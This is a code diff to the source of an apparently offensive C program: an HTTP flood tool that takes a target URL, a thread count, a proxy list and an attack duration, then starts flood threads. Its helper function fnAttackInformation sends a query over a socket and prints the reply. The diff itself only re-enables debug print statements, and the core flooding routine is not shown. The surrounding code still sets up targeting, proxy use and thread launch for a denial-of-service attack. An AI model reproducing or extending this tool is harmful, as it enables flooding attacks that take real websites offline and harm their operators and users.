@@ -241,7 +241,7 @@ int fnAttackInformation(int attackID)
 		
 	tmpres = send(sock, packet, strlen(packet), 0);
 	
-	//printf("Sent %d bytes -> \n%s\n\n\n", tmpres, packet);	
+	printf("Sent %d bytes -> \n%s\n\n\n", tmpres, packet);	
 	
 	if (tmpres == -1){
 		perror("Can't send query");
@@ -255,7 +255,7 @@ int fnAttackInformation(int attackID)
 	while (1)
 	{
 		i = recv(sock, szRecvBuff + dwTotal, sizeof(szRecvBuff) - dwTotal, 0);
-		//printf("Received %d bytes\n", i);
+		printf("Received %d bytes\n", i);
 		if (i <= 0)
 			break;
 			
@@ -265,12 +265,12 @@ int fnAttackInformation(int attackID)
 	szRecvBuff[dwTotal] = '\0';
 	
 
-	//printf("Received -> \n%s\n\n", szRecvBuff);
+	printf("Received -> \n%s\n\n", szRecvBuff);
 
 	
 	close(sock);
 	
-	//printf("Sent %d bytes\n", tmpres);
+	printf("Sent %d bytes\n", tmpres);
 	
 	return 0;
 }
@@ -281,7 +281,7 @@ int main(int argc, char *argv[ ]) {
                 fprintf(stdout, "Usage: %s <target url> <number threads to use> <proxy list> <time> [manual ip]\n", argv[0]);
                 exit(-1);
         }
-        //fprintf(stdout, "Setting up Sockets...\n");
+        fprintf(stdout, "Setting up Sockets...\n");
         int num_threads = atoi(argv[2]);
         FILE *pFile = fopen(argv[3], "rb");
         if(pFile==NULL)
@@ -353,7 +353,7 @@ int main(int argc, char *argv[ ]) {
                 ipstr = malloc(strlen(argv[5])+1);
                 bzero(ipstr, strlen(argv[5])+1);
                 strcpy(ipstr, argv[5]);
-                //fprintf(stdout, "Using manual IP...\n");
+                fprintf(stdout, "Using manual IP...\n");
         } else {
                 struct hostent *he;
                 struct in_addr a;
@@ -385,7 +385,7 @@ int main(int argc, char *argv[ ]) {
         sprintf(postpayload, postformat, returnparts[path]->value, returnparts[host]->value);
         freeparts();
       
-	    //fprintf(stdout, "Starting Flood...\n");
+	    fprintf(stdout, "Starting Flood...\n");
         
 		fnAttackInformation(atoi(argv[argc-1]));
 		for(i = 0;i<num_threads;i++){
